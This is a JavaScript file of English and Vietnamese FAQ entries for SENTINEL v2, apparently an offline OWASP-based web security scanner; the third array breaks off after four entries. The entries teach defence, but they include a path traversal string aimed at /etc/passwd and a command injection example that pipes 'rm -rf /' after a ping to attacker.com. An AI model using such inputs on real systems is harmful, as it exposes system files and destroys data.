// Dữ liệu FAQ - Khai báo inline để luôn được bundle cùng ứng dụng
const INLINE_FAQ_DATA_EN = [
  {
    id: "faq_what_is_sentinel",
    keywords: ["sentinel", "tool", "app"],
    question: "SENTINEL is what?",
    answer: "SENTINEL v2 is a web security testing tool following OWASP Top 10, running offline as an Electron app. Two modes: URL Scan (black-box) and Project Scan (static code analysis)."
  },
  {
    id: "faq_how_to_use",
    keywords: ["usage", "guide", "start"],
    question: "How to use SENTINEL?",
    answer: "1. Choose URL Scan or Project Scan tab. 2. Enter target (URL or code folder). 3. Set depth and budget. 4. Click Start Scan. 5. Review findings by severity."
  },
  {
    id: "faq_url_scan",
    keywords: ["url scan", "black-box", "runtime"],
    question: "What is URL Scan?",
    answer: "URL Scan sends real HTTP requests to target URL to detect runtime vulnerabilities. Configure URL, Crawl Depth (0-2), Request Budget (30-200)."
  },
  {
    id: "faq_project_scan",
    keywords: ["project scan", "source code", "static"],
    question: "What is Project Scan?",
    answer: "Project Scan analyzes source code statically without running it. Detects CVE, hardcoded secrets, sensitive config, unsafe patterns without network connection."
  },
  {
    id: "faq_crawl_depth",
    keywords: ["crawl depth", "depth"],
    question: "What is Crawl Depth?",
    answer: "Crawl Depth determines how many link layers SENTINEL traverses: 0=root URL only, 1=root+direct links (recommended), 2=deeper for large sites."
  },
  {
    id: "faq_request_budget",
    keywords: ["request budget", "limit"],
    question: "What is Request Budget?",
    answer: "Request Budget = max HTTP requests allowed. 30=fast, 60=balanced (recommended), 120=thorough, 200=comprehensive. Higher budget detects more injection flaws."
  },
  {
    id: "faq_auth",
    keywords: ["authentication", "cookie", "token"],
    question: "How to add Authentication?",
    answer: "Expand Authentication section. Choose: Cookie (from DevTools), Bearer Token (JWT), Authorization Header, or Custom Headers (JSON). Login first, copy from DevTools is easiest."
  },
  {
    id: "faq_owasp",
    keywords: ["owasp", "top 10"],
    question: "What is OWASP Top 10?",
    answer: "List of 10 most critical web security risks: A01=Access Control, A02=Cryptography, A03=Injection, A04=Design, A05=Config, A06=Components, A07=Auth, A08=Integrity, A09=Logging, A10=SSRF."
  },
  {
    id: "faq_severity",
    keywords: ["severity", "level"],
    question: "What severity levels mean?",
    answer: "Critical=fix immediately, High=urgent, Medium=schedule fix, Low=best practice. Priority: Critical > High > Medium > Low."
  },
  {
    id: "faq_risk_score",
    keywords: ["risk score", "gauge"],
    question: "What is Risk Score?",
    answer: "Score 0-100 reflecting overall risk: Critical +10, High +7, Medium +4, Low +1. Levels: 70-100=Critical, 40-69=High, 15-39=Medium, 0-14=Low."
  },
  {
    id: "faq_sql_injection",
    keywords: ["sql injection", "database"],
    question: "What is SQL Injection?",
    answer: "Embedding user data into SQL without safe handling, allowing attackers to modify query logic. Fix: Parameterized Queries, ORM, input validation, least privilege DB account."
  },
  {
    id: "faq_xss",
    keywords: ["xss", "scripting"],
    question: "What is XSS?",
    answer: "Injecting malicious JavaScript that runs in another user's browser. Types: Reflected (URL param), Stored (database), DOM (client-side). Fix: encode, DOMPurify, CSP, HttpOnly."
  },
  {
    id: "faq_csrf",
    keywords: ["csrf", "forgery"],
    question: "What is CSRF?",
    answer: "Tricking a browser into sending requests to an app where user is logged in, from another attacker-controlled site. Fix: CSRF tokens, SameSite cookies, Origin checking."
  },
  {
    id: "faq_idor",
    keywords: ["idor", "access control"],
    question: "What is IDOR?",
    answer: "User accessing another's resources by changing ID in request because server doesn't verify ownership. Fix: verify server-side, use UUIDs, RBAC, test with multiple accounts."
  },
  {
    id: "faq_headers",
    keywords: ["security headers"],
    question: "What are Security Headers?",
    answer: "HTTP headers protecting browsers: X-Frame-Options (clickjacking), CSP (XSS), HSTS (HTTPS), X-Content-Type (MIME). All should be set properly."
  },
  {
    id: "faq_ssti",
    keywords: ["ssti", "template injection"],
    question: "What is SSTI?",
    answer: "Server-Side Template Injection - embedding code in template engines (Jinja, EJS) for server-side execution. Fix: never put user input in templates, use safe functions."
  },
  {
    id: "faq_findings_explain",
    keywords: ["findings", "vulnerability"],
    question: "What are Findings in report?",
    answer: "Findings = detected vulnerabilities. Each shows: name, severity, CWE/OWASP category, description, affected URL/file, fix recommendation."
  },
  {
    id: "faq_export",
    keywords: ["export", "report"],
    question: "How to export report?",
    answer: "Click Export button on right panel. Choose format: HTML (readable) or JSON (programmatic). File saved to Desktop or specified folder."
  },
  {
    id: "faq_history",
    keywords: ["history", "scan history"],
    question: "What is History?",
    answer: "History saves all previous scans. Click History tab to view. Open old scan to reload results. Helps track fix progress and compare scans over time."
  },
  {
    id: "faq_checklist",
    keywords: ["checklist"],
    question: "What is Checklist?",
    answer: "Checklist shows actions needed to comply with OWASP Top 10. Use for planning, tracking progress, assigning tasks. Mark complete when fixed."
  },
  {
    id: "faq_collector",
    keywords: ["collector", "scanner"],
    question: "What is Collector?",
    answer: "Tools in Project Scan: config-scanner finds .env/config, dependency-scanner checks package.json/pom.xml, secret-scanner detects hardcoded API keys/passwords."
  },
  {
    id: "faq_false_positive",
    keywords: ["false positive"],
    question: "What is false positive?",
    answer: "Finding SENTINEL reports that isn't actually a vulnerability. Happens when heuristics aren't accurate. Should verify manually before fixing."
  },
  {
    id: "faq_slow_scan",
    keywords: ["slow", "performance"],
    question: "Scan running slow?",
    answer: "Reduce Crawl Depth, lower Request Budget, disable unnecessary features. Or target server/network slow. Run scan during low-traffic periods."
  },
  {
    id: "faq_stop_scan",
    keywords: ["stop", "cancel"],
    question: "How to stop scan?",
    answer: "Click Stop button on progress bar. Scan stops and summarizes current findings. Report saved, can export what was already scanned."
  },
  {
    id: "faq_dependency",
    keywords: ["dependency", "cve"],
    question: "What are CVE vulnerabilities?",
    answer: "CVE = Common Vulnerabilities. SENTINEL checks package.json/pom.xml/build.gradle for dependencies with known CVEs. Update or patch immediately."
  },
  {
    id: "faq_docker_security",
    keywords: ["docker", "container", "kubernetes", "dockerfile", "k8s", "docker compose", "docker security", "container security"],
    question: "What is Docker security?",
    answer: "Docker security focuses on hardening container images and runtime. Common issues include: running containers as `root`, using overly-permissive `privileged`/capabilities, shipping insecure Dockerfiles (copying secrets into images, broad file permissions), outdated base images, and missing resource limits. Fixes: run as non-root, avoid privileged containers, add only needed capabilities, scan/pin image versions (and update frequently), keep images minimal, apply resource limits (CPU/memory), and never bake secrets into images—use build-time secrets or runtime env/secret managers."
  },
  {
    id: "faq_hardcoded_secrets",
    keywords: ["hardcoded secrets", "password"],
    question: "What are hardcoded secrets?",
    answer: "Secret (password, API key, token) written directly in code instead of environment variables. Dangerous if code pushed to GitHub. Fix: use .env, dotenv, config management."
  },
  {
    id: "faq_cors",
    keywords: ["cors", "cross-origin"],
    question: "What is CORS?",
    answer: "CORS = Cross-Origin Resource Sharing. Controls requests from different domains. Misconfiguration: * allows all domains. Fix: whitelist specific domains."
  },
  {
    id: "faq_jwt",
    keywords: ["jwt", "token"],
    question: "What is JWT?",
    answer: "JWT = JSON Web Token. Stateless auth token with 3 parts: header.payload.signature. Fix: verify signature server-side, set expiration, use HTTPS, HttpOnly storage."
  },
  {
    id: "faq_ssrf",
    keywords: ["ssrf"],
    question: "What is SSRF?",
    answer: "SSRF - server uses arbitrary user-provided URL to send internal requests. Attackers access internal resources. Fix: whitelist URLs, validate protocol, block internal IPs."
  },
  {
    id: "faq_ai_limitation",
    keywords: ["ai", "limitation"],
    question: "AI assistant limitations?",
    answer: "AI runs offline, knowledge from local FAQ (no real-time updates). Cannot access network. Cannot replace security experts or comprehensive automated testing."
  },
  {
    id: "faq_path_traversal",
    keywords: ["path traversal"],
    question: "What is path traversal?",
    answer: "Attack using ../ to access files outside allowed directory. Example: /download?file=../../../../etc/passwd. Fix: validate paths, whitelist allowed files."
  },
  {
    id: "faq_clickjacking",
    keywords: ["clickjacking"],
    question: "What is clickjacking?",
    answer: "Embedding site in invisible iframe, user clicks something else but actually clicks attacker's button. Fix: X-Frame-Options: DENY, Content-Security-Policy frame-ancestors."
  },
  {
    id: "faq_open_redirect",
    keywords: ["open redirect"],
    question: "What is open redirect?",
    answer: "App redirects user to arbitrary URL from parameter without validation. Used for phishing. Fix: whitelist redirect URLs, validate domain."
  },
  {
    id: "faq_command_injection",
    keywords: ["command injection", "rce"],
    question: "What is command injection?",
    answer: "Embedding OS commands in user input. Example: system('ping ' + userInput). Fix: don't use system(), use safe libraries, strict input validation, sandboxing."
  },
  {
    id: "faq_rate_limiting",
    keywords: ["rate limiting", "dos"],
    question: "What is rate limiting?",
    answer: "Limiting requests per user/IP in time period. Prevents brute force, DDoS. Fix: implement rate limiting middleware, use CDN, monitor abuse patterns."
  },
  {
    id: "faq_password_security",
    keywords: ["password", "hash"],
    question: "What is password security?",
    answer: "Hash passwords with bcrypt/argon2, not plaintext/MD5. Use salt. Implement password policy, MFA, rate limit attempts, secure reset flows."
  },
  {
    id: "faq_api_security",
    keywords: ["api", "endpoint"],
    question: "What is API security?",
    answer: "API = interface for app communication. Security: authentication (tokens), authorization (permissions), rate limiting, input validation, HTTPS, logging/monitoring."
  },
  {
    id: "faq_sensitive_data_exposure",
    keywords: ["sensitive data", "pii"],
    question: "What is sensitive data exposure?",
    answer: "Exposing sensitive data (PII, payment, credentials) over unencrypted network. Fix: HTTPS, encrypt at rest, PII masking, secure error messages, log filtering."
  },
  {
    id: "faq_session_management",
    keywords: ["session", "cookie"],
    question: "What is session management?",
    answer: "Managing user sessions. Fix: HttpOnly cookies, Secure flag, SameSite attribute, set expiration, regenerate ID after login, invalidate on logout, HTTPS only."
  },
  {
    id: "faq_env_config",
    keywords: ["environment", ".env"],
    question: "What is environment config?",
    answer: ".env file contains per-environment config: DB URL, API keys, secrets. Never commit to git. Load via dotenv, rotate secrets regularly."
  },
  {
    id: "faq_xml_xxe",
    keywords: ["xxe", "xml"],
    question: "What is XXE?",
    answer: "XML External Entity - exploiting XML parser to reference external entities (files). Used to read files, SSRF, DoS. Fix: disable DTD, external entities, use safe parsers."
  },
  {
    id: "faq_subresource_integrity",
    keywords: ["sri", "integrity"],
    question: "What is Subresource Integrity?",
    answer: "SRI verifies integrity of files from CDN. Adds hash to script/link tags. If attacker modifies CDN file, browser rejects it. Fix: generate SRI hash, add attribute."
  },
  {
    id: "faq_broken_object_auth",
    keywords: ["broken authentication"],
    question: "What is broken object authentication?",
    answer: "Weak sessions/tokens, predictable, server-side validation missing. Fix: use cryptographically strong tokens, set expiration, invalidate on logout, secure storage."
  },
  {
    id: "faq_pentest_vs_vuln_scan",
    keywords: ["penetration test", "scan"],
    question: "Penetration testing vs scanning?",
    answer: "Scanning=tools like SENTINEL detect vulnerabilities. Pentest=manual exploitation of vulnerabilities, logic flaws. Use both: scanning for speed, pentest for depth."
  },
  {
    id: "faq_2fa_mfa",
    keywords: ["2fa", "mfa"],
    question: "What is 2FA/MFA?",
    answer: "Second layer authentication (OTP/authenticator/biometric). Protects if password compromised. Fix: make 2FA optional then mandatory, provide backup codes."
  },
  {
    id: "faq_oauth",
    keywords: ["oauth"],
    question: "What is OAuth?",
    answer: "OAuth2 protocol for user login via 3rd party (Google, GitHub). Fix: validate redirect URI, use strong state parameter, HTTPS only, secure token refresh."
  },
  {
    id: "faq_file_upload",
    keywords: ["file upload"],
    question: "What is file upload security?",
    answer: "User file uploads risk malware/shells if validation weak. Fix: whitelist file types (not extension), scan files, rename, store outside web root, set permissions."
  },
  {
    id: "faq_graphql_security",
    keywords: ["graphql"],
    question: "What is GraphQL security?",
    answer: "GraphQL endpoints vulnerable to: query injection, rate limit bypass (batch queries), complexity attacks. Fix: complexity limits, rate limiting, field validation, auth checks."
  },
  {
    id: "faq_websocket_security",
    keywords: ["websocket"],
    question: "What is WebSocket security?",
    answer: "WebSocket = persistent connection. Risks: bypass CORS/auth, message injection. Fix: use WSS (encrypted), validate origin, per-message auth, rate limiting."
  }
];
// Dữ liệu FAQ - Khai báo inline để luôn được bundle cùng ứng dụng
// Bộ tri thức bảo mật OWASP đầy đủ cho trợ lý AI offline
const INLINE_FAQ_DATA_DUP_1 = [
  { "id": "faq_what_is_sentinel", "keywords": ["sentinel là gì", "tool", "ứng dụng", "phần mềm", "công cụ"], "question": "SENTINEL là gì?", "answer": "SENTINEL v2 là công cụ kiểm thử bảo mật web theo OWASP Top 10, chạy offline dưới dạng Electron app. Hai chế độ: URL Scan (black-box) và Project Scan (static code analysis)." },
  { "id": "faq_how_to_use", "keywords": ["cách dùng", "hướng dẫn", "bắt đầu"], "question": "Cách dùng SENTINEL cơ bản?", "answer": "1. Chọn tab URL Scan hoặc Project Scan. 2. Nhập mục tiêu (URL hoặc thư mục code). 3. Cấu hình depth và budget. 4. Nhấn Start Scan. 5. Xem findings theo severity." },
  { "id": "faq_url_scan", "keywords": ["url scan", "black-box", "runtime"], "question": "URL Scan là gì?", "answer": "URL Scan gửi HTTP request thực tế tới target URL để phát hiện lỗ hổng runtime. Cấu hình URL, Crawl Depth (0-2), Request Budget (30-200)." },
  { "id": "faq_project_scan", "keywords": ["project scan", "source code", "static"], "question": "Project Scan là gì?", "answer": "Project Scan phân tích source code tĩnh mà không chạy code. Phát hiện CVE, hardcoded secrets, config nhạy cảm, unsafe patterns mà không kết nối mạng." },
  { "id": "faq_crawl_depth", "keywords": ["crawl depth", "độ sâu"], "question": "Crawl Depth là gì?", "answer": "Crawl Depth xác định SENTINEL duyệt bao nhiêu lớp link: 0=URL gốc, 1=URL gốc+link trực tiếp (khuyến nghị), 2=sâu hơn cho site lớn." },
  { "id": "faq_request_budget", "keywords": ["request budget", "giới hạn request"], "question": "Request Budget là gì?", "answer": "Request Budget = tổng HTTP request tối đa. 30=nhanh, 60=cân bằng (khuyến nghị), 120=kỹ hơn, 200=toàn diện. Budget cao → phát hiện nhiều injection hơn." },
  { "id": "faq_auth", "keywords": ["authentication", "cookie", "token", "login"], "question": "Cách thêm Authentication?", "answer": "Mở rộng section Authentication. Chọn: Cookie (từ DevTools), Bearer Token (JWT), Authorization Header, hoặc Custom Headers (JSON). Đăng nhập trước, copy từ DevTools là cách đơn giản nhất." },
  { "id": "faq_owasp", "keywords": ["owasp", "top 10", "danh mục", "a01-a10"], "question": "OWASP Top 10 là gì?", "answer": "Danh sách 10 rủi ro bảo mật web phổ biến: A01=Broken Access Control, A02=Crypto Failures, A03=Injection, A04=Insecure Design, A05=Misconfig, A06=Vulnerable Components, A07=Auth Failures, A08=Integrity Issues, A09=Logging Failures, A10=SSRF." },
  { "id": "faq_severity", "keywords": ["severity", "mức độ", "critical", "high", "medium", "low"], "question": "Mức severity nghĩa là gì?", "answer": "Critical=cực nguy hiểm vá ngay, High=nghiêm trọng cân xử lý, Medium=có thể khai thác trong điều kiện, Low=best practice violation. Ưu tiên: Critical > High > Medium > Low." },
  { "id": "faq_risk_score", "keywords": ["risk score", "điểm rủi ro", "gauge"], "question": "Risk Score là gì?", "answer": "Điểm 0-100 phản ánh rủi ro tổng thể: Critical +10, High +7, Medium +4, Low +1. Phân loại: 70-100=Critical Risk, 40-69=High, 15-39=Medium, 0-14=Low." },
  { "id": "faq_sql_injection", "keywords": ["sql injection", "sqli", "database"], "question": "SQL Injection là gì?", "answer": "Nhúng dữ liệu user vào SQL mà không xử lý an toàn. Kể tấn công thay đổi query logic. Fix: Parameterized Queries, ORM, validate input, principle of least privilege DB account." },
  { "id": "faq_xss", "keywords": ["xss", "cross-site scripting", "javascript"], "question": "XSS là gì?", "answer": "Inject JavaScript độc hại vào trang web chạy trong browser user khác. Ba loại: Reflected (URL param), Stored (DB), DOM (client-side). Fix: encode output, DOMPurify, CSP header, HttpOnly cookie." },
  { "id": "faq_csrf", "keywords": ["csrf", "cross-site request forgery"], "question": "CSRF là gì?", "answer": "Lừa browser gửi request đến app người dùng đăng nhập từ site khác mà không hay biết. Fix: CSRF token, SameSite cookie, check Origin/Referer, yêu cầu xác nhận mật khẩu." },
  { "id": "faq_idor", "keywords": ["idor", "broken access control", "authorization"], "question": "IDOR là gì?", "answer": "User truy cập trực tiếp tài nguyên người khác bằng thay ID vì server không kiểm tra quyền. Fix: verify ownership server-side, dùng UUID, RBAC, test 2 account." },
  { "id": "faq_headers", "keywords": ["security headers", "header", "x-frame-options"], "question": "Security Headers là gì?", "answer": "HTTP headers giúp bảo vệ browser: X-Frame-Options (clickjacking), X-Content-Type (MIME sniffing), CSP (XSS), HSTS (HTTPS), Permissions-Policy (API access). Cần set đầy đủ." },
  { "id": "faq_ssti", "keywords": ["ssti", "server-side template injection"], "question": "SSTI là gì?", "answer": "Server-Side Template Injection - nhúng code vào template engine (Jinja, EJS, Pug) để thực thi code phía server. Fix: không user input vào template, use safe template functions." },
  { "id": "faq_findings_explain", "keywords": ["findings", "results", "vulnerability"], "question": "Findings trong report là gì?", "answer": "Findings = lỗ hổng phát hiện. Mỗi finding hiển thị: tên, severity, CWE/OWASP category, description, affected URL/file, fix recommendation. Nhấn vào finding để xem chi tiết." },
  { "id": "faq_export", "keywords": ["export", "báo cáo", "download"], "question": "Cách export report?", "answer": "Nhấn nút Export ở góc phải panel. Chọn format: HTML (readable), JSON (programmatic). File được lưu vào Desktop hoặc folder chỉ định. HTML report có dashboard interactif." },
  { "id": "faq_history", "keywords": ["history", "lịch sử", "scan history"], "question": "History là gì?", "answer": "History lưu tất cả scan đã chạy trước đó. Nhấn History tab để xem. Click scan cũ để reload kết quả. Giúp track tiến độ fix và so sánh scan theo thời gian." },
  { "id": "faq_checklist", "keywords": ["checklist", "framework"], "question": "Checklist là gì?", "answer": "Checklist tab hiển thị hành động cần làm để tuân theo OWASP Top 10. Dùng để planning, track progress, assign task. Có thể mark complete khi fix xong." },
  { "id": "faq_collector", "keywords": ["collector", "config-scanner", "dependency-scanner"], "question": "Collector là gì?", "answer": "Collector = tool trong Project Scan. Config-scanner tìm .env, config file. Dependency-scanner check package.json/pom.xml/build.gradle. Secret-scanner phát hiện API key, password hardcode." },
  { "id": "faq_false_positive", "keywords": ["false positive", "lỗi phát hiện"], "question": "False positive là gì?", "answer": "Finding mà SENTINEL báo mà thực tế không phải lỗ. Xảy ra khi heuristic không đủ chính xác. Nên verify bằng manual test trước fix. Báo xuống SENTINEL team." },
  { "id": "faq_slow_scan", "keywords": ["slow", "scan chậm"], "question": "Scan chạy chậm?", "answer": "Giảm Crawl Depth (từ 2→1), giảm Request Budget (từ 200→60), tắt unnecessary features. Hoặc: target server chậm, hoặc network chậm. Chạy scan vào lúc network ít tải." },
  { "id": "faq_stop_scan", "keywords": ["stop", "dừng scan", "cancel"], "question": "Cách dừng scan?", "answer": "Nhấn tombol Stop ở progress bar. Scan sẽ dừng và tổng hợp findings hiện tại. Report vẫn được lưu, có thể export những gì đã scan được." },
  { "id": "faq_dependency", "keywords": ["dependency", "package.json", "npm", "vulnerabilitiy", "cve"], "question": "CVE vulnerabilities là gì?", "answer": "CVE = Common Vulnerabilities & Exposures. SENTINEL kiểm tra package.json (npm), pom.xml (Maven), build.gradle (Gradle) tìm dependencies có CVE công khai. Update hoặc patch immediately." },
  { "id": "faq_hardcoded_secrets", "keywords": ["hardcoded", "secrets", "password", "api key"], "question": "Hardcoded secrets là gì?", "answer": "Secret (password, API key, token) viết cứng trong code thay vì environment variable. Nguy hiểm nếu code push lên GitHub. Fix: dùng .env, dotenv, config management, rotate secret." },
  { "id": "faq_cors", "keywords": ["cors", "cross-origin"], "question": "CORS là gì?", "answer": "CORS = Cross-Origin Resource Sharing. Control request từ domain khác. Misconfiguration: Access-Control-Allow-Origin: * cho phép tất cả. Fix: whitelist domain, không dùng wildcard." },
  { "id": "faq_jwt", "keywords": ["jwt", "json web token", "token"], "question": "JWT là gì?", "answer": "JWT = JSON Web Token. Stateless authentication token. Có 3 phần: header.payload.signature. Fix: verify signature phía server, set expiration, use HTTPS, HttpOnly cookie." },
  { "id": "faq_ssrf", "keywords": ["ssrf", "server-side request forgery"], "question": "SSRF là gì?", "answer": "SSRF - server dùng URL tùy ý từ user để gửi request nội bộ. Kẻ tấn công access internal resources. Fix: whitelist URL, validate protocol, disable internal IP ranges, network isolation." },
  { "id": "faq_ai_limitation", "keywords": ["ai", "limitation", "offline"], "question": "AI assistant có giới hạn gì?", "answer": "AI chạy offline, kiến thức từ FAQ local (không update real-time). Không thể access mạng. Không thay thế security expert hoặc automated testing toàn bộ. Dùng để learning và quick reference." },
  { "id": "faq_path_traversal", "keywords": ["path traversal", "directory traversal", "file access"], "question": "Path traversal là gì?", "answer": "Attack dùng ../ để access file bên ngoài directory cho phép. Ví dụ: /download?file=../../../../etc/passwd. Fix: validate path, whitelist allowed files, không allow ../ character." },
  { "id": "faq_clickjacking", "keywords": ["clickjacking", "ui redress"], "question": "Clickjacking là gì?", "answer": "Embed website vào invisible iframe, user click thứ gì khác mà thực tế click button trên website bị tấn công. Fix: X-Frame-Options: DENY/SAMEORIGIN, Content-Security-Policy frame-ancestors." },
  { "id": "faq_open_redirect", "keywords": ["open redirect", "redirect"], "question": "Open Redirect là gì?", "answer": "App redirect user tới URL tùy ý từ parameter mà không validate. Dùng cho phishing. Fix: whitelist redirect URL, validate URL domain thuộc whitelist, relative redirect." },
  { "id": "faq_command_injection", "keywords": ["command injection", "os command", "rce"], "question": "Command Injection là gì?", "answer": "Nhúng OS command vào input user. Ví dụ: system('ping ' + userInput) → ping attacker.com |rm -rf /. Fix: không dùng system(), dùng library safe, validate input strictly, sandboxing." },
  { "id": "faq_rate_limiting", "keywords": ["rate limiting", "dos", "throttle"], "question": "Rate limiting là gì?", "answer": "Giới hạn số request từ user/IP trong khoảng thời gian. Tránh brute force password, DDoS. Fix: implement rate limiting middleware, use CDN, monitor abuse patterns." },
  { "id": "faq_password_security", "keywords": ["password", "bcrypt", "hash"], "question": "Password security là gì?", "answer": "Hash password dùng bcrypt/argon2, not plain text/MD5. Salt (random) + hash. Never log password. Implement password policy, MFA, rate limit login attempt, secure password reset." },
  { "id": "faq_api_security", "keywords": ["api", "rest api", "endpoint"], "question": "API security là gì?", "answer": "API = interface app communicate. Bảo mật: Authentication (token), authorization (permission), rate limiting, validate input, use HTTPS, version deprecation, logging/monitoring." },
  { "id": "faq_sensitive_data_exposure", "keywords": ["sensitive data", "pii", "disclosure"], "question": "Sensitive Data Exposure là gì?", "answer": "Lộ dữ liệu nhạy cảm (PII, payment, credential) qua network không encrypt, error message, log, database unencrypted. Fix: HTTPS, encrypt at rest, PII masking, secure error handling." },
  { "id": "faq_session_management", "keywords": ["session", "cookie", "state"], "question": "Session management là gì?", "answer": "Quản lý session user. Fix: HttpOnly cookie, Secure flag, SameSite, set expiration, regenerate session ID after login, invalidate on logout, HTTPS only." },
  { "id": "faq_env_config", "keywords": ["environment", ".env", "configuration"], "question": "Environment configuration là gì?", "answer": ".env file chứa config per environment (dev/prod): DB URL, API key, secret. Không commit .env vào git. Load via dotenv library, rotate secret, audit access log." },
  { "id": "faq_xml_xxe", "keywords": ["xxe", "xml", "dtd", "entity"], "question": "XXE (XML External Entity) là gì?", "answer": "XXE lợi dụng XML parser để reference external entity (file). Dùng để read internal file, SSRF, DoS. Fix: disable DTD, external entities, entity expansion, use safe XML parser." },
  { "id": "faq_subresource_integrity", "keywords": ["sri", "integrity", "cdn", "javascript"], "question": "Subresource Integrity (SRI) là gì?", "answer": "SRI kiểm tra integrity file từ CDN. Thêm hash vào script/link tag. Nếu attacker modify CDN file, browser reject. Fix: generate SRI hash, add integrity attribute." },
  { "id": "faq_broken_object_auth", "keywords": ["broken authentication", "session", "token"], "question": "Broken Object Authentication là gì?", "answer": "Session=insufficient, token=predictable, không validate server-side. Fix: use cryptographically strong session/token, set expiration, invalidate on logout, secure storage." },
  { "id": "faq_pentest_vs_vuln_scan", "keywords": ["penetration test", "vulnerability scan", "difference"], "question": "Penetration testing vs scanning là gì?", "answer": "Scanning=dùng tool như SENTINEL phát hiện lỗ hổng. Pentest=manual thử khai thác lỗ hổng, find logic flaw, social eng. Dùng cả hai: scan nhanh, pentest chi tiết." },
  { "id": "faq_2fa_mfa", "keywords": ["2fa", "mfa", "multi-factor"], "question": "2FA/MFA là gì?", "answer": "Xác thực lớp 2 (OTP/authenticator/biometric). Thêm bảo vệ nếu password bị compromise. Fix: implement 2FA optional → mandatory, backup code, secure delivery OTP." },
  { "id": "faq_oauth", "keywords": ["oauth", "oauth2", "social login"], "question": "OAuth là gì?", "answer": "OAuth2=protocol cho user login qua 3rd party (Google, GitHub). Fix: validate redirect URI, use strong state parameter, HTTPS only, handle token refresh securely." },
  { "id": "faq_file_upload", "keywords": ["file upload", "file type", "directory"], "question": "File upload security là gì?", "answer": "User upload file dễ bypass validation upload malware/shell. Fix: whitelist file type (không dùng extension), scan file, rename, store outside web root, set permissions." },
  { "id": "faq_graphql_security", "keywords": ["graphql", "query", "fragment"], "question": "GraphQL security là gì?", "answer": "GraphQL endpoint dễ bị: query injection, rate limit bypass (batch query), query complexity attack, N+1 query. Fix: query complexity limit, rate limiting, field validation, auth check." },
  { "id": "faq_websocket_security", "keywords": ["websocket", "real-time", "wss"], "question": "WebSocket security là gì?", "answer": "WebSocket = persistent connection. Danger: bypass CORS/auth, message injection. Fix: use WSS (encrypted), validate origin, auth per message, rate limit, never trust client data." }
];
// Dữ liệu FAQ - Khai báo inline để luôn được bundle cùng ứng dụng
// Bộ tri thức bảo mật OWASP đầy đủ
const INLINE_FAQ_DATA_DUP_2 = [
  { "id": "faq_what_is_sentinel", "keywords": ["sentinel là gì", "tool là gì", "ứng dụng này", "phần mềm này", "công cụ này", "giới thiệu"], "question": "SENTINEL là gì?", "answer": "## SENTINEL v2 là gì?\n\nSENTINEL v2 là công cụ kiểm thử bảo mật web theo chuẩn **OWASP Top 10 — 2025**, chạy trực tiếp trên máy dưới dạng Electron app. Mục tiêu là giúp developer và sinh viên học bảo mật theo chuẩn quốc tế một cách thực hành, không cần kết nối internet.\n\n**Hai chế độ scan chính:**\n- **URL Scan**: Kiểm thử black-box — gửi HTTP request thực tế đến target URL để phát hiện lỗ hổng runtime\n- **Project Scan**: Phân tích source code tĩnh — không chạy code, không kết nối mạng, tìm lỗ hổng trong code và dependencies\n\n**Điểm nổi bật:**\n- Hoạt động hoàn toàn offline\n- Phát hiện lỗ hổng theo chuẩn OWASP\n- Xuất báo cáo HTML/JSON\n- Lưu lịch sử scan tự động" },
  { "id": "faq_how_to_use", "keywords": ["cách dùng", "cách sử dụng", "hướng dẫn", "bắt đầu", "bước đầu", "sử dụng như thế nào", "làm thế nào"], "question": "Cách sử dụng SENTINEL cơ bản?", "answer": "## Quy trình sử dụng SENTINEL\n\n**Bước 1 — Chọn chế độ scan**\nChọn tab **URL Scan** (kiểm thử website) hoặc **Project Scan** (kiểm thử source code) trên thanh điều hướng.\n\n**Bước 2 — Nhập mục tiêu**\n- URL Scan: nhập URL đầy đủ, ví dụ `https://example.com`\n- Project Scan: nhấn Browse để chọn thư mục gốc dự án\n\n**Bước 3 — Cấu hình**\n- **Crawl Depth**: độ sâu duyệt link (0, 1 hoặc 2)\n- **Request Budget**: số request tối đa (60 là cân bằng tốt)\n- **Authentication**: thêm cookie hoặc token nếu cần\n\n**Bước 4 — Chạy scan**\nNhấn **Start Scan** và theo dõi tiến trình realtime.\n\n**Bước 5 — Xem kết quả**\nFindings hiển thị ở panel phải, sắp xếp theo mức độ nguy hiểm. Nhấn vào finding để xem chi tiết và hướng dẫn khắc phục." },
  { "id": "faq_url_scan", "keywords": ["url scan", "scan url", "quét url", "kiểm thử url", "black-box", "blackbox", "url là gì"], "question": "URL Scan là gì và dùng thế nào?", "answer": "## URL Scan — Black-box Testing\n\n**URL Scan** gửi HTTP request thực tế đến URL mục tiêu để phát hiện lỗ hổng có thể khai thác từ bên ngoài (không cần source code).\n\n**Cách cấu hình:**\n\n**URL**: Nhập đầy đủ bao gồm giao thức, ví dụ:\n- `https://example.com`\n- `http://localhost:3000`\n\n**Crawl Depth**:\n- `0` — chỉ kiểm thử URL gốc\n- `1` — URL gốc và tất cả link trực tiếp (khuyến nghị)\n- `2` — duyệt sâu hơn, phù hợp site lớn cần kiểm tra kỹ\n\n**Request Budget**:\n- `30` — nhanh, bao phủ cơ bản\n- `60` — cân bằng, phù hợp đa số trường hợp\n- `200` — kiểm tra kỹ, tốn nhiều thời gian hơn\n\n**Lưu ý quan trọng**: Chỉ scan các hệ thống bạn được phép kiểm thử. Hành vi trái phép là vi phạm pháp luật." },
  { "id": "faq_project_scan", "keywords": ["project scan", "scan project", "quét code", "source code", "static", "phân tích code", "tĩnh"], "question": "Project Scan hoạt động như thế nào?", "answer": "## Project Scan — Static Code Analysis\n\n**Project Scan** phân tích source code tĩnh mà không chạy code hoặc kết nối mạng. Phù hợp để kiểm tra dự án trong quá trình phát triển.\n\n**Các loại lỗ hổng được phát hiện:**\n- **Dependencies CVE**: kiểm tra `package.json`, `pom.xml`, `build.gradle` có dependency lỗi thời\n- **Hardcoded secrets**: API key, password, token trong code\n- **Config files nhạy cảm**: `.env` files, config chứa credentials\n- **Logging patterns thiếu an toàn**: log dữ liệu nhạy cảm\n- **Insecure code patterns**: SQL query không dùng parameterized, v.v.\n\n**Tech stack hỗ trợ:**\nNode.js/React, Spring Boot/Java, PHP/Laravel, và generic projects.\n\n**Cách dùng:**\n1. Nhấn **Browse** và chọn thư mục gốc dự án\n2. SENTINEL tự động phát hiện tech stack và quét\n3. Kết quả hiển thị theo từng file và loại lỗ hổng\n\n**Mẹo**: Kết hợp cả URL Scan và Project Scan để phát hiện đầy đủ lỗ hổng — một số lỗi chỉ xuất hiện khi chạy thực tế (runtime), một số chỉ thấy qua code." },
